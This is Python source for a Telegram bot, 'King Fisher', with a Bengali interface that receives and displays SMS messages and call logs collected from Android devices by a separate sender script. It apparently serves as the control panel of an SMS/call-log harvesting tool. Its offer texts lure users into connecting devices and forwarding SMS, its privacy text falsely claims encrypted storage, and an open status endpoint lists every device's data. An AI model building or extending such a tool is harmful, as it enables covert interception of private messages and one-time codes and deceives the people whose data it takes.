"""
King Fisher Bot - Real Device Data Integration
Telegram bot that receives and displays real SMS/Call logs from Android devices
"""

import os
import logging
from contextlib import asynccontextmanager
from typing import Dict, List
from datetime import datetime
import random

from fastapi import FastAPI, Request, Header, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============ LOGGING ============
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger("KingFisherBot")

# ============ ENVIRONMENT ============
BOT_TOKEN = os.getenv("BOT_TOKEN")
PUBLIC_URL = os.getenv("PUBLIC_URL", "").rstrip("/")
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET", "")

if not BOT_TOKEN:
    raise RuntimeError("❌ BOT_TOKEN is not set")
if not PUBLIC_URL:
    raise RuntimeError("❌ PUBLIC_URL is not set")

# ============ TELEGRAM APP ============
telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()

# ============ DATA STORAGE ============
DEVICE_DATA = {
    "sms": {},
    "calls": {},
    "devices": set(),
    "device_names": {}
}
MAX_HISTORY = 100

class DeviceDataManager:
    @staticmethod
    def register_device(device_id: str, device_name: str = None):
        DEVICE_DATA["devices"].add(device_id)
        if device_name:
            DEVICE_DATA["device_names"][device_id] = device_name
        elif device_id not in DEVICE_DATA["device_names"]:
            DEVICE_DATA["device_names"][device_id] = device_id

    @staticmethod
    def get_device_name(device_id: str) -> str:
        return DEVICE_DATA["device_names"].get(device_id, device_id)

    @staticmethod
    def get_devices_with_names() -> List[Dict]:
        return [
            {"id": device_id, "name": DeviceDataManager.get_device_name(device_id)}
            for device_id in DEVICE_DATA["devices"]
        ]
    
    @staticmethod
    def get_device_details(device_id: str) -> Dict:
        return {
            "id": device_id,
            "name": DeviceDataManager.get_device_name(device_id),
            "sms_count": len(DEVICE_DATA["sms"].get(device_id, [])),
            "call_count": len(DEVICE_DATA["calls"].get(device_id, [])),
        }
    
    @staticmethod
    def store_sms(device_id: str, sms_list: List[Dict], device_name: str = None):
        if device_id not in DEVICE_DATA["sms"]:
            DEVICE_DATA["sms"][device_id] = []
        for sms in sms_list:
            sms_id = sms.get("id")
            if sms_id:
                existing = [s for s in DEVICE_DATA["sms"][device_id] if s.get("id") == sms_id]
                if not existing:
                    DEVICE_DATA["sms"][device_id].append(sms)
        DEVICE_DATA["sms"][device_id] = DEVICE_DATA["sms"][device_id][-MAX_HISTORY:]
        DeviceDataManager.register_device(device_id, device_name)

    @staticmethod
    def store_calls(device_id: str, call_list: List[Dict], device_name: str = None):
        if device_id not in DEVICE_DATA["calls"]:
            DEVICE_DATA["calls"][device_id] = []
        for call in call_list:
            call_id = call.get("id")
            if call_id:
                existing = [c for c in DEVICE_DATA["calls"][device_id] if c.get("id") == call_id]
                if not existing:
                    DEVICE_DATA["calls"][device_id].append(call)
        DEVICE_DATA["calls"][device_id] = DEVICE_DATA["calls"][device_id][-MAX_HISTORY:]
        DeviceDataManager.register_device(device_id, device_name)

    @staticmethod
    def get_sms(device_id: str, limit: int = 10) -> List[Dict]:
        return DEVICE_DATA["sms"].get(device_id, [])[-limit:]

    @staticmethod
    def get_calls(device_id: str, limit: int = 10) -> List[Dict]:
        return DEVICE_DATA["calls"].get(device_id, [])[-limit:]

    @staticmethod
    def get_stats() -> Dict:
        sms_count = sum(len(v) for v in DEVICE_DATA["sms"].values())
        call_count = sum(len(v) for v in DEVICE_DATA["calls"].values())
        return {
            "devices": len(DEVICE_DATA["devices"]),
            "sms": sms_count,
            "calls": call_count,
            "total": sms_count + call_count
        }

# ============ UI COMPONENTS ============

def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📦 সিস্টেম আইটেম", callback_data="items")],
        [
            InlineKeyboardButton("🔄 রিস্টার্ট", callback_data="restart"),
            InlineKeyboardButton("🔒 বন্ধ করুন", callback_data="close"),
        ],
        [
            InlineKeyboardButton("❓ সাহায্য", callback_data="help"),
            InlineKeyboardButton("ℹ️ সম্পর্কে", callback_data="about"),
        ],
        [
            InlineKeyboardButton("📜 শর্তাবলী", callback_data="terms"),
            InlineKeyboardButton("🔐 গোপনীয়তা", callback_data="privacy"),
        ],
        [
            InlineKeyboardButton("🆘 সাপোর্ট", callback_data="support"),
            InlineKeyboardButton("🎁 অফার", callback_data="offer"),
        ],
    ])

def items_menu():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📩 এসএমএস ইনবক্স", callback_data="sms"),
            InlineKeyboardButton("📞 কল লিস্ট", callback_data="call"),
        ],
        [InlineKeyboardButton("📊 সিস্টেম স্ট্যাটাস", callback_data="status")],
        [InlineKeyboardButton("📱 ডিভাইসসমূহ", callback_data="devices")],
        [InlineKeyboardButton("🔙 পিছনে যান", callback_data="back_items")],
    ])

def back_menu(target="main"):
    if target == "main":
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 মূল মেনুতে ফিরুন", callback_data="back_main")]
        ])
    elif target == "items":
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 আইটেম মেনুতে ফিরুন", callback_data="back_items")]
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 পিছনে যান", callback_data="back_main")]
        ])

def get_offer_text():
    offers = [
        "🎉 <b>বিশেষ অফার!</b> প্রথম ১০ জন ব্যবহারকারী পাচ্ছেন <b>ফ্রি প্রিমিয়াম</b> অ্যাক্সেস!",
        "🔥 <b>সীমিত সময়ের অফার!</b> আজই যোগ দিন এবং পাবেন <b>৫০% ছাড়</b>!",
        "💎 <b>প্রিমিয়াম ফিচার</b> এখন <b>ফ্রি</b>! শুধু আজকের জন্য!",
        "🚀 <b>নতুন আপডেট!</b> রিয়েল-টাইম SMS এবং কল লগ এখন <b>আরও দ্রুত</b>!",
        "🎁 <b>গিফট!</b> আপনার প্রথম ডিভাইস সংযোগে পাবেন <b>বোনাস ক্রেডিট</b>!",
    ]
    return random.choice(offers)

def get_greeting():
    hour = datetime.now().hour
    if 5 <= hour < 12:
        return "🌅 সুপ্রভাত!"
    elif 12 <= hour < 17:
        return "☀️ শুভ অপরাহ্ন!"
    elif 17 <= hour < 21:
        return "🌇 শুভ সন্ধ্যা!"
    else:
        return "🌙 শুভ রাত্রি!"

# ============ TEXT TEMPLATES (বক্স স্টাইল) ============

OPENING = """
╔════════════════════════════╗
   👑 <b>কিং ফিশার সিস্টেম</b>
╚════════════════════════════╝

✨ <b>সিস্টেম সক্রিয় হয়েছে</b>

স্বাগতম, <b>{name}</b>! {greeting}

🟢 <b>স্ট্যাটাস:</b> অনলাইন
⚡ <b>মোড:</b> রিয়েল ডেটা
🛡️ <b>নিরাপত্তা:</b> সুরক্ষিত

{offer}

<i>চালিয়ে যেতে একটি অপশন নির্বাচন করুন।</i>
"""

CLOSING = """
╔════════════════════════════╗
      🔒 <b>সেশন বন্ধ হয়েছে</b>
╚════════════════════════════╝

কিং ফিশার ব্যবহার করার জন্য ধন্যবাদ।

🟡 <b>স্ট্যাটাস:</b> স্ট্যান্ডবাই
🔐 <b>সেশন:</b> বন্ধ

<i>সিস্টেম আবার খুলতে /start লিখুন।</i>
"""

HELP = """
╔════════════════════════════╗
   ❓ <b>কিং ফিশার — সাহায্য</b>
╚════════════════════════════╝

━━━━━━━━━━━━━━━━━━
📦 <b>সিস্টেম আইটেম</b>
রিয়েল এসএমএস/কল লগ দেখুন

📱 <b>ডিভাইসসমূহ</b>
সংযুক্ত ডিভাইস দেখুন

🔄 <b>রিস্টার্ট</b>
ইন্টারফেস রিফ্রেশ করুন

🔒 <b>বন্ধ করুন</b>
বর্তমান ইন্টারফেস বন্ধ করুন

📜 <b>শর্তাবলী</b>
ব্যবহারের শর্তাবলী দেখুন

🔐 <b>গোপনীয়তা</b>
গোপনীয়তা নীতি দেখুন

🆘 <b>সাপোর্ট</b>
সাহায্য পেতে যোগাযোগ করুন

🎁 <b>অফার</b>
বর্তমান অফার দেখুন
━━━━━━━━━━━━━━━━━━

📌 <b>দ্রুত কমান্ড:</b>
/start — বট চালু করুন
/help — সাহায্য দেখুন
/status — স্ট্যাটাস দেখুন
/terms — শর্তাবলী
/privacy — গোপনীয়তা
/support — সাপোর্ট
/offer — অফার

<i>ডেটা আপনার অ্যান্ড্রয়েড ডিভাইস থেকে সংগ্রহ করা হয়।</i>
"""

ABOUT = """
╔════════════════════════════╗
   ℹ️ <b>কিং ফিশার সম্পর্কে</b>
╚════════════════════════════╝

👑 <b>কিং ফিশার বট</b>
রিয়েল ডিভাইস ইন্টিগ্রেশন সহ প্রিমিয়াম টেলিগ্রাম বট।

━━━━━━━━━━━━━━━━━━
🟢 ওয়েবহুক: সক্রিয়
🟢 রানটাইম: পাইথন (FastAPI)
🟢 মোড: রিয়েল ডেটা
🟢 প্ল্যাটফর্ম: অ্যান্ড্রয়েড
━━━━━━━━━━━━━━━━━━

🔹 <b>বৈশিষ্ট্য:</b>
• রিয়েল-টাইম এসএমএস মনিটরিং
• রিয়েল-টাইম কল লগ মনিটরিং
• মাল্টি-ডিভাইস সাপোর্ট
• সুরক্ষিত ওয়েবহুক যোগাযোগ

<i>রিয়েল-টাইম এসএমএস এবং কল লগ মনিটরিং।</i>
"""

TERMS = """
╔════════════════════════════╗
   📜 <b>শর্তাবলী</b>
╚════════════════════════════╝

1. এই বট শুধুমাত্র ব্যক্তিগত ব্যবহারের জন্য।
2. ডেটা সুরক্ষিতভাবে সংরক্ষণ করা হয়।
3. বট ব্যবহারে কোনো অবৈধ কাজ সমর্থিত নয়।
4. সার্ভিস যেকোনো সময় পরিবর্তন হতে পারে।
5. ব্যবহারকারী নিজের ডেটার জন্য দায়ী।

📌 <b>যোগাযোগ:</b> @honeyy_bees
"""

PRIVACY = """
╔════════════════════════════╗
   🔐 <b>গোপনীয়তা নীতি</b>
╚════════════════════════════╝

• আপনার SMS এবং কল লগ শুধুমাত্র আপনার কাছেই দেখা যায়।
• ডেটা তৃতীয় পক্ষের সাথে শেয়ার করা হয় না।
• ডেটা এনক্রিপ্টেডভাবে সংরক্ষণ করা হয়।
• যেকোনো সময় ডেটা মুছে ফেলতে পারেন।

🔒 <b>নিরাপত্তা স্তর:</b> উচ্চ
"""

SUPPORT = """
╔════════════════════════════╗
   🆘 <b>সাপোর্ট</b>
╚════════════════════════════╝

আপনার কোনো প্রশ্ন বা সমস্যা থাকলে যোগাযোগ করুন:

📩 <b>টেলিগ্রাম:</b> @honeyy_bees
📧 <b>ইমেইল:</b> support@kingfisher.bot

⏰ <b>সময়:</b> ২৪/৭ সাপোর্ট

আমরা ২৪ ঘন্টার মধ্যে উত্তর দেবার চেষ্টা করি।
"""

OFFER = f"""
╔════════════════════════════╗
   🎁 <b>বিশেষ অফার!</b>
╚════════════════════════════╝

{get_offer_text()}

━━━━━━━━━━━━━━━━━━
🟢 <b>কীভাবে পাবেন?</b>
১. আপনার ডিভাইস সংযোগ করুন
২. প্রথম SMS ফরওয়ার্ড করুন
৩. স্বয়ংক্রিয়ভাবে অফার পাবেন!

📌 <b>সীমিত সময়ের অফার!</b>
"""

# ============ FORMATTERS ============

def format_realtime_sms(sms_list: List[Dict]) -> str:
    if not sms_list:
        return "📭 <b>কোনো SMS বার্তা পাওয়া যায়নি</b>\n\n<i>নিশ্চিত করুন আপনার অ্যান্ড্রয়েড ডিভাইস সংযুক্ত আছে এবং সেন্ডার স্ক্রিপ্ট চলছে।</i>"
    lines = ["📩 <b>রিয়েল এসএমএস ইনবক্স</b>", "━━━━━━━━━━━━━━━━━━"]
    for i, sms in enumerate(sms_list[:10], 1):
        sender = sms.get("sender", "অজানা")
        body = sms.get("body", "")[:100]
        timestamp = sms.get("timestamp", "")
        msg_type = sms.get("type", "received")
        icon = "📥" if msg_type == "received" else "📤"
        time_str = timestamp[:16] if timestamp else "অজানা"
        lines.append(f"{i}. {icon} <b>{sender}</b>")
        lines.append(f"   {body[:80]}{'...' if len(body) > 80 else ''}")
        lines.append(f"   <i>{time_str}</i>")
        lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <i>মোট: {len(sms_list)} বার্তা</i>")
    return "\n".join(lines)

def format_realtime_calls(call_list: List[Dict]) -> str:
    if not call_list:
        return "📭 <b>কোনো কল লগ পাওয়া যায়নি</b>\n\n<i>নিশ্চিত করুন আপনার অ্যান্ড্রয়েড ডিভাইস সংযুক্ত আছে এবং সেন্ডার স্ক্রিপ্ট চলছে।</i>"
    lines = ["📞 <b>রিয়েল কল লগ</b>", "━━━━━━━━━━━━━━━━━━"]
    icons = {"Incoming": "📞", "Outgoing": "📤", "Missed": "❌", "Rejected": "🚫", "Blocked": "⛔", "Voicemail": "🎙️"}
    for i, call in enumerate(call_list[:10], 1):
        number = call.get("number", "অজানা")
        name = call.get("name", "অজানা")
        duration = call.get("duration", "0")
        timestamp = call.get("timestamp", "")
        call_type = call.get("type", "অজানা")
        icon = icons.get(call_type, "📞")
        duration_str = "০সে"
        if duration.isdigit():
            dur = int(duration)
            if dur >= 60:
                duration_str = f"{dur//60}মি {dur%60}সে"
            else:
                duration_str = f"{dur}সে"
        time_str = timestamp[:16] if timestamp else "অজানা"
        lines.append(f"{i}. {icon} <b>{name}</b> ({number})")
        lines.append(f"   📱 {call_type} • ⏱️ {duration_str}")
        lines.append(f"   <i>{time_str}</i>")
        lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <i>মোট: {len(call_list)} কল</i>")
    return "\n".join(lines)

def format_status(stats: Dict, devices: List[Dict]) -> str:
    if not devices:
        device_lines = ["   • কোনো ডিভাইস সংযুক্ত নেই"]
    else:
        device_lines = []
        for dev in devices:
            name = dev['name'][:30] + '...' if len(dev['name']) > 30 else dev['name']
            device_lines.append(f"   🟢 <b>{name}</b>")
            device_lines.append(f"      🆔 {dev['id'][:16]}...")
            sms_count = len(DEVICE_DATA["sms"].get(dev['id'], []))
            call_count = len(DEVICE_DATA["calls"].get(dev['id'], []))
            device_lines.append(f"      📩 {sms_count} SMS • 📞 {call_count} Calls")
    return f"""📊 <b>সিস্টেম স্ট্যাটাস</b>

━━━━━━━━━━━━━━━━━━
🟢 <b>বট:</b> অনলাইন
🟢 <b>API:</b> প্রস্তুত
🟢 <b>ওয়েবহুক:</b> সক্রিয়

📱 <b>সংযুক্ত ডিভাইস:</b> {stats['devices']}
📩 <b>SMS বার্তা:</b> {stats['sms']}
📞 <b>কল লগ:</b> {stats['calls']}
📊 <b>মোট রেকর্ড:</b> {stats['total']}

🔗 <b>সক্রিয় ডিভাইস:</b>
{chr(10).join(device_lines)}
━━━━━━━━━━━━━━━━━━
<i>অ্যান্ড্রয়েড ডিভাইস থেকে রিয়েল-টাইম ডেটা।</i>"""

def format_device_info(devices: List[Dict]) -> str:
    if not devices:
        return "📭 <b>কোনো ডিভাইস সংযুক্ত নেই</b>\n\n<i>প্রথমে আপনার অ্যান্ড্রয়েড ডিভাইস থেকে ডেটা পাঠান।</i>"
    lines = ["📱 <b>সংযুক্ত ডিভাইসসমূহ</b>", "━━━━━━━━━━━━━━━━━━"]
    for dev in devices:
        name = dev['name'][:25] + '...' if len(dev['name']) > 25 else dev['name']
        lines.append(f"🟢 <b>{name}</b>")
        lines.append(f"   🆔 {dev['id'][:20]}...")
        lines.append(f"   📩 {dev.get('sms_count', 0)} SMS")
        lines.append(f"   📞 {dev.get('call_count', 0)} Calls")
        lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <i>মোট ডিভাইস: {len(devices)}</i>")
    return "\n".join(lines)

# ============ COMMAND HANDLERS ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = update.effective_user.first_name or "ব্যবহারকারী"
    greeting = get_greeting()
    offer = get_offer_text()
    await update.message.reply_text(
        OPENING.format(name=name, greeting=greeting, offer=f"🎁 {offer}"),
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu(),
    )

async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔄 <b>সিস্টেম রিস্টার্ট হয়েছে</b>\n\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "🟢 ইন্টারফেস রিফ্রেশ করা হয়েছে\n"
        "🟢 সার্ভিস প্রস্তুত\n"
        "🟢 সেশন সক্রিয়\n"
        "━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu(),
    )

async def close_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(CLOSING, parse_mode=ParseMode.HTML)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        HELP,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        ABOUT,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def devices_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    devices_list = DeviceDataManager.get_devices_with_names()
    device_details = [DeviceDataManager.get_device_details(dev["id"]) for dev in devices_list]
    await update.message.reply_text(
        format_device_info(device_details),
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def terms_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        TERMS,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def privacy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        PRIVACY,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def support_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        SUPPORT,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def offer_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        OFFER,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = DeviceDataManager.get_stats()
    devices_list = DeviceDataManager.get_devices_with_names()
    await update.message.reply_text(
        format_status(stats, devices_list),
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

# ============ CALLBACK HANDLER ============

async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    d = q.data
    user_id = str(q.from_user.id)
    device_id = f"device_{user_id}"
    
    if d == "items":
        await q.edit_message_text(
            "📦 <b>সিস্টেম আইটেম</b>\n\n<i>একটি বিভাগ নির্বাচন করুন:</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=items_menu(),
        )
    elif d == "sms":
        sms_data = DeviceDataManager.get_sms(device_id, 10)
        await q.edit_message_text(
            format_realtime_sms(sms_data),
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu("items"),
        )
    elif d == "call":
        call_data = DeviceDataManager.get_calls(device_id, 10)
        await q.edit_message_text(
            format_realtime_calls(call_data),
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu("items"),
        )
    elif d == "status":
        stats = DeviceDataManager.get_stats()
        devices_list = DeviceDataManager.get_devices_with_names()
        await q.edit_message_text(
            format_status(stats, devices_list),
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu("main"),
        )
    elif d == "devices":
        devices_list = DeviceDataManager.get_devices_with_names()
        device_details = [DeviceDataManager.get_device_details(dev["id"]) for dev in devices_list]
        await q.edit_message_text(
            format_device_info(device_details),
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu("main"),
        )
    elif d == "restart":
        await q.edit_message_text(
            "🔄 <b>সিস্টেম রিস্টার্ট হয়েছে</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "🟢 ইন্টারফেস রিফ্রেশ করা হয়েছে\n"
            "🟢 সার্ভিস প্রস্তুত\n"
            "🟢 সেশন সক্রিয়\n"
            "━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu(),
        )
    elif d == "close":
        await q.edit_message_text(CLOSING, parse_mode=ParseMode.HTML)
    elif d == "help":
        await q.edit_message_text(
            HELP, parse_mode=ParseMode.HTML, reply_markup=back_menu("main")
        )
    elif d == "about":
        await q.edit_message_text(
            ABOUT, parse_mode=ParseMode.HTML, reply_markup=back_menu("main")
        )
    elif d == "terms":
        await q.edit_message_text(
            TERMS, parse_mode=ParseMode.HTML, reply_markup=back_menu("main")
        )
    elif d == "privacy":
        await q.edit_message_text(
            PRIVACY, parse_mode=ParseMode.HTML, reply_markup=back_menu("main")
        )
    elif d == "support":
        await q.edit_message_text(
            SUPPORT, parse_mode=ParseMode.HTML, reply_markup=back_menu("main")
        )
    elif d == "offer":
        await q.edit_message_text(
            OFFER, parse_mode=ParseMode.HTML, reply_markup=back_menu("main")
        )
    elif d == "back_main":
        name = q.from_user.first_name or "ব্যবহারকারী"
        greeting = get_greeting()
        offer = get_offer_text()
        await q.edit_message_text(
            OPENING.format(name=name, greeting=greeting, offer=f"🎁 {offer}"),
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu(),
        )
    elif d == "back_items":
        await q.edit_message_text(
            "📦 <b>সিস্টেম আইটেম</b>\n\n<i>একটি বিভাগ নির্বাচন করুন:</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=items_menu(),
        )

# ============ REGISTER HANDLERS ============

telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CommandHandler("restart", restart))
telegram_app.add_handler(CommandHandler("close", close_cmd))
telegram_app.add_handler(CommandHandler("help", help_cmd))
telegram_app.add_handler(CommandHandler("about", about_cmd))
telegram_app.add_handler(CommandHandler("devices", devices_cmd))
telegram_app.add_handler(CommandHandler("terms", terms_cmd))
telegram_app.add_handler(CommandHandler("privacy", privacy_cmd))
telegram_app.add_handler(CommandHandler("support", support_cmd))
telegram_app.add_handler(CommandHandler("offer", offer_cmd))
telegram_app.add_handler(CommandHandler("status", status_cmd))
telegram_app.add_handler(CallbackQueryHandler(callbacks))

# ============ FASTAPI APP ============

@asynccontextmanager
async def lifespan(app: FastAPI):
    await telegram_app.initialize()
    await telegram_app.start()
    webhook_url = f"{PUBLIC_URL}/telegram/webhook"
    await telegram_app.bot.set_webhook(url=webhook_url, secret_token=WEBHOOK_SECRET or None, drop_pending_updates=True)
    logger.info("✅ Webhook configured: %s", webhook_url)
    yield
    try:
        await telegram_app.stop()
        await telegram_app.shutdown()
        logger.info("✅ Bot shut down successfully")
    except Exception as e:
        logger.error(f"❌ Shutdown error: {e}")

app = FastAPI(title="King Fisher Bot", version="3.0.0", description="Real-time SMS and Call Log Monitor", lifespan=lifespan)

app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])

@app.get("/")
async def home():
    return {"status": "online", "service": "King Fisher Bot", "version": "3.0.0", "mode": "Real Data", "docs": "/docs"}

@app.get("/health")
async def health():
    stats = DeviceDataManager.get_stats()
    return {"status": "healthy", "devices": stats["devices"], "messages": stats["total"]}

@app.post("/telegram/webhook")
async def webhook(request: Request, x_telegram_bot_api_secret_token: str | None = Header(default=None)):
    if WEBHOOK_SECRET and x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
        raise HTTPException(status_code=403, detail="Invalid webhook secret")
    try:
        data = await request.json()
        update = Update.de_json(data, telegram_app.bot)
        await telegram_app.process_update(update)
        return {"ok": True}
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/status")
async def status():
    stats = DeviceDataManager.get_stats()
    devices = DeviceDataManager.get_devices_with_names()
    device_details = [{"id": dev["id"], "name": dev["name"], "sms_count": len(DEVICE_DATA["sms"].get(dev["id"], [])), "call_count": len(DEVICE_DATA["calls"].get(dev["id"], []))} for dev in devices]
    return {"status": "online", "devices": stats["devices"], "sms": stats["sms"], "calls": stats["calls"], "total": stats["total"], "device_list": device_details}
